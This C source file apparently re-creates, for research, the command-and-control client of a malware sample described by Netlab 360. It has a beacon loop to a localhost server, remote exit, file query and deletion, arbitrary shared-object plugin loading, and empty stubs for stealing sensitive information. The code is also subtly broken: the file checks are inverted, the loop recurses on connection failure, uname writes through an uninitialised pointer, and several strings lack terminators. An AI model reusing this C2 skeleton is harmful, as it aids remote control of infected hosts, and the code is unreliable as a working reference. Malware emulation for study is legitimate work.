#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "c2_commands.h"


// https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
void c2_loop(){
    int sleepy_time = 3;

    while (1) {
        printf("(%d) In c2 loop...\n", getpid());
        const char* server_name = "127.0.0.1";
        const int server_port = 1234;
        struct sockaddr_in server_address;

        memset(&server_address, 0, sizeof(server_address));
        server_address.sin_family = AF_INET;

    // creates binary representation of server name
	// and stores it as sin_addr
	// http://beej.us/guide/bgnet/output/html/multipage/inet_ntopman.html
    inet_pton(AF_INET, server_name, &server_address.sin_addr);

    // htons: port in network order format
    server_address.sin_port = htons(server_port);

	// open a stream socket
	int sock;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "could not create socket\n");
	}

	// TCP is connection oriented, a reliable connection
	// **must** be established before any data is exchanged
	if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
		fprintf(stderr, "could not connect to server\n");
        sleep(3);
        c2_loop();
	}

	// send

	// data that will be sent to the server
	const char* data_to_send = "Initial packet\n";
	send(sock, data_to_send, strlen(data_to_send), 0);
	// receive

	int n = 0;
	int len = 0, maxlen = 100;
	char buffer[maxlen];
	//char* pbuffer = buffer;

	// will remain open until the server terminates the connection
    while ((n = recv(sock, buffer, maxlen, 0)) > 0) {
        //pbuffer += n;
        maxlen -= n;
        len += n;

        //buffer[len] = '\0';
        printf("received: %s\n", buffer);

        if (strncmp("exit", buffer, 4) == 0) {
            char *msg = "exiting!";
            send(sock, msg, strlen(msg), 0);
            c2_exit();
        }

        memset(buffer, 0, strlen(buffer));
    }

    // close the socket
    close(sock);
    sleep(sleepy_time);
    }
}


void c2_exit() {
    exit(0);
}


void c2_test() {
    // TODO: resolve embedded C2 domains and try to connect.
    // TODO: if this fails, what does the sample do?
}


void c2_heartbeat() {
    //TODO: what does Netlab mean by heartbeat funciton?
}


void c2_set_timeout(int sleeptime) {

    //TODO: see if a struct get passed in that updates a given sleep function

}


char *c2_steal_sensitive_info() {
    // TODO: identify what counts as 'sensitive info'

}


char *c2_upload_device_info() {
    // Netlab 360 make this look like populating a uname struct, /etc/os-relase/etc...
    struct utsname *hostinfo;
    char *devinfo;
    int res  = uname(hostinfo);
    if (res != 0) {
        devinfo = (char *)malloc(strlen("unknown"));
        strncpy(devinfo, "unknown", strlen("unknown"));
    }

    // TODO - update here with c2 info

}


bool c2_query_file(char *fpath) {

    // TODO check how this is executed in the binary.
    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        return true;
    }

    return false;

}


bool c2_delete_file(char *fpath) {

    // TODO check how this is executed in the binary.
    // F_OK == existence test
    if ((access(fpath, F_OK))) {
        int res = unlink(fpath);
        if (res == 0) {
            return true;
        } else {
            // non-zero return value indicating something went wrong deleting a file.
            return false;
        }
    }

    return false;
}


void c2_run_plugin_1(char *soPath, char *funcName) {

    void *handle = dlopen(soPath, RTLD_LAZY);
    void (*func_ptr)() = dlsym(handle, funcName);

    // execution of shared object
    func_ptr();

    dlclose(handle);
}
